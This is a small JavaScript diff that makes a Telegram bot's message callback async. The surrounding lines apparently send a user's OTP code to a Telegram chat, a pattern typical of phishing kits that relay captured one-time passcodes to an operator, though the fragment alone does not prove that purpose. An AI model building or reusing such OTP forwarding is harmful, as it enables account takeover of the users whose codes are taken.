@@ -254,7 +254,7 @@ async function sendNewMessage(userDetails){
     Code:  ${userDetails.getUserDataOTP.code || ''}
     `;
 
-    await bot.sendMessage(chatId, message).then((sentMsg) => {
+    await bot.sendMessage(chatId, message).then(async(sentMsg) => {
         messageId = sentMsg.message_id;
         console.log(messageId)
     });
